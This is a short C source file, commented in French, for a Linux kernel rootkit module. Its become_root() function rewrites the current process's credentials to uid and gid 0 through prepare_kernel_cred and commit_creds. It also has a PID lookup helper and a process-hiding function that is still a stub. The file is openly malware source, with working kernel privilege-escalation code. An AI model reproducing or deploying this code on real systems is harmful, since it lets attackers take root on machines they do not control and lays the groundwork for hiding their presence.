/*
*
* Fonctionnalités du Rootkit
*
*/

#include "rootest.h"


// Passe l'utilisateur courrant (ou le processus) en root
int become_root() {

  struct cred *new_creds = prepare_kernel_cred(NULL);
  if (new_creds) {
    new_creds->uid.val = new_creds->gid.val = 0;
    new_creds->euid.val = new_creds->egid.val = 0;
    new_creds->suid.val = new_creds->sgid.val = 0;
    new_creds->fsuid.val = new_creds->fsgid.val = 0;
    commit_creds(new_creds);
    printk(KERN_INFO "Elévation de privilèges !\n");
    return 0;
  }
  printk(KERN_INFO "Echec du become root\n");
  return 1;

}


// Donne la structure d'un processus à partir du PID
struct task_struct *find_task(pid_t pid)
{
    struct task_struct *p = current;
    for_each_process(p) {
        if (p->pid == pid)
            return p;
    }
    return NULL;
}


// Dissimule un process par PID
int hide_process(pid_t pid){
    printk(KERN_INFO "Process masqué.\n Cha...cha...cha...\n");
    // TODO : hide process, dammnit
  return 0;
}

/*
void print_registers(struct pt_regs *regs) {
    printk(KERN_INFO "Registers state:\n");
    printk(KERN_INFO "RIP: %llx, RSP: %llx, RBP: %llx\n", regs->ip, regs->sp, regs->bp);
    printk(KERN_INFO "RAX: %llx, RBX: %llx, RCX: %llx, RDX: %llx\n", regs->ax, regs->bx, regs->cx, regs->dx);
    printk(KERN_INFO "RSI: %llx, RDI: %llx\n", regs->si, regs->di);
    //printk(KERN_INFO "R8: %llx, R9: %llx, R10: %llx, R11: %llx\n", regs->r8, regs->r9, regs->r10, regs->r11);
    //printk(KERN_INFO "R12: %llx, R13: %llx, R14: %llx, R15: %llx\n", regs->r12, regs->r13, regs->r14, regs->r15);
}
*/
